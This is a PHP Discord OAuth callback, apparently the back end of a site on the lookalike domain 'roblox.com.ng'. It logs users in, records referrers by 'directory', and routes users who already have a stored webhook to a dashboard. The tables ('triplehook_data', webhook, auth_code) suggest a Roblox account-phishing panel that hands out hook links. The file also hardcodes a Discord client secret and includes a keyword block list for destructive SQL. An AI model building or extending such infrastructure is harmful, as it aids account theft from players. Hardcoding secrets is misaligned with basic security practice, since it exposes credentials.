<?php
header('Content-Type: application/json; charset=UTF-8');

include '../libs/configuration.php';
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
include '../libs/connection.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Invalid method']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true);
$code = $input['code'] ?? null;
$directory = $input['directory'] ?? null;

if (!$code) {
    echo json_encode(['success' => false, 'error' => 'No code']);
    exit;
}

if (!$directory) {
    echo json_encode(['success' => false, 'error' => 'No directory']);
    exit;
}

try {
    // Directory'nin sahibinin link_id'sini bul
    $referrerLinkId = null;
    try {
        $refQuery = "SELECT link_id FROM triplehook_data WHERE directory_name = :directory LIMIT 1";
        $refResult = executeSafeQuery($refQuery, [':directory' => $directory]);
        if (!empty($refResult)) {
            $referrerLinkId = $refResult[0]['link_id'];
        }
    } catch (Exception $e) {}
    
    // Referrer bilgisini session'a kaydet
    $_SESSION['triplehook_referrer'] = $referrerLinkId;
    $_SESSION['triplehook_directory'] = $directory;
    
    $tokenData = exchangeCodeForToken($code);
    if (!$tokenData || !isset($tokenData['access_token'])) {
        throw new Exception('Token exchange failed');
    }
    
    $userData = getUserData($tokenData['access_token']);
    if (!$userData || !isset($userData['id'])) {
        throw new Exception('User data failed');
    }
    
    $discord_id = $userData['id'];
    $discord_username = $userData['username'];
    
    $default_avatar = 'https://images-eds-ssl.xboxlive.com/image?url=4rt9.lXDC4H_93laV1_eHHFT949fUipzkiFOBH3fAiZZUCdYojwUyX2aTonS1aIwMrx6NUIsHfUHSLzjGJFxxsG72wAo9EWJR4yQWyJJaDaK1XdUso6cUMpI9hAdPUU_FNs11cY1X284vsHrnWtRw7oqRpN1m9YAg21d_aNKnIo-&format=source&h=307';
    
    if (!empty($userData['avatar'])) {
        $ext = (strpos($userData['avatar'], 'a_') === 0) ? 'gif' : 'png';
        $discord_avatar = 'https://cdn.discordapp.com/avatars/' . $discord_id . '/' . $userData['avatar'] . '.' . $ext;
    } else {
        $discord_avatar = $default_avatar;
    }
    
    $_SESSION['discord_user_id'] = $discord_id;
    $_SESSION['discord_username'] = $discord_username;
    $_SESSION['discord_avatar'] = $discord_avatar;
    $_SESSION['discord_access_token'] = $tokenData['access_token'];
    $_SESSION['login_method'] = 'discord';
    $_SESSION['login_time'] = time();
    
    // Mevcut kullanıcı kontrolü
    $existingUser = null;
    try {
        $checkQuery = "SELECT auth_code, link_id, webhook, discord_username FROM regular WHERE discord_id = :discord_id LIMIT 1";
        $checkResult = executeSafeQuery($checkQuery, [':discord_id' => $discord_id]);
        if (!empty($checkResult)) {
            $existingUser = $checkResult[0];
        }
    } catch (Exception $e) {}
    
    // Eğer kullanıcı zaten varsa ve webhook'u varsa direkt dashboard'a yönlendir
    if ($existingUser && !empty($existingUser['auth_code']) && !empty($existingUser['webhook'])) {
        $_SESSION['auth_code'] = $existingUser['auth_code'];
        $_SESSION['link_id'] = $existingUser['link_id'];
        $_SESSION['triplehook'] = 'False';
        
        try {
            $updateQuery = "UPDATE regular SET discord_username = :username, discord_avatar = :avatar, last_login = NOW() WHERE discord_id = :discord_id";
            executeSafeQuery($updateQuery, [
                ':username' => $discord_username,
                ':avatar' => $discord_avatar,
                ':discord_id' => $discord_id
            ]);
        } catch (Exception $e) {}
        
        echo json_encode([
            'success' => true,
            'redirect' => true,
            'redirectUrl' => '/pages/dashboard'
        ]);
        exit;
    }
    
    $_SESSION['discord_authenticated'] = true;
    echo json_encode(['success' => true, 'redirect' => false]);
    
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => $e->getMessage()]);
}

function exchangeCodeForToken($code) {
    $url = 'https://discord.com/api/oauth2/token';
    
    // ÖNEMLİ: Bu redirect_uri, Discord OAuth'a gönderilen ile BİREBİR AYNI olmalı!
    $redirectUri = 'https://roblox.com.ng/pages/auth';
    
    $data = [
        'client_id' => '1462060640201084958',
        'client_secret' => 'bG85JOZqnxsModAYiP3R_MFYcCvawGo6',
        'grant_type' => 'authorization_code',
        'code' => $code,
        'redirect_uri' => $redirectUri
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpCode !== 200) throw new Exception('Discord token: ' . $httpCode);
    return json_decode($response, true);
}

function getUserData($accessToken) {
    $url = 'https://discord.com/api/users/@me';
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: Bearer ' . $accessToken]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($httpCode !== 200) throw new Exception('Discord user: ' . $httpCode);
    return json_decode($response, true);
}